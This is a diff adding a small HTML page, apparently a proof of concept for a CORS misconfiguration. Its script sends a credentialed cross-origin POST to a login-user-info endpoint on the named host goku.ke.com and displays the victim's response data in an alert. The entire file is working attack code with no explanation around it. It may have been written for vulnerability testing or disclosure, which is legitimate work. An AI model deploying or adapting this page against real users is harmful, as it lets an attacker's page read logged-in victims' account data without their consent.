@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+<title>cors liyon</title>
+
+</head>
+
+<body>
+
+<script type="text/javascript">
+
+var http = new XMLHttpRequest();
+
+var url = 'https://goku.ke.com/web/loginUser/info';
+
+var params = 'json=login';
+
+http.open('POST', url, true);
+
+http.withCredentials = true;
+
+http.onreadystatechange = function() {
+
+if(http.readyState == 4 && http.status == 200) {
+
+alert(http.responseText);
+
+}
+
+}
+
+http.send(params);
+
+</script>
+
+</body>
+
+</html>
